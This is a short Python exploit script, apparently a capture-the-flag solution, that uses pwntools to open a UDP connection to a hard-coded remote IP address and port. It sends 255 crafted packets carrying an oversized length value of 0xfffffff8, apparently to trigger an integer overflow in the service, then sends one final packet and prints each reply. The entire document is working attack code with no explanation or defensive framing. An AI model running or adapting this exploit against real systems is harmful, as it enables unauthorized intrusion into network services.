from pwn import *
import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #s.connect(("localhost", 54321))
    s.connect(("18.118.161.198", 10444))
    return s

def exploit(p):
    for i in range(255):
        msg = b""
        msg += p16(1)
        msg += p16(2)
        msg += p32(0xfffffff8)
        p.send(msg)
        print(p.recvfrom(1024))

    msg = b""
    msg += p16(2)
    msg += p16(4)
    msg += p32(9)
    p.send(msg)
    print(p.recvfrom(1024))

p = connect()
exploit(p)
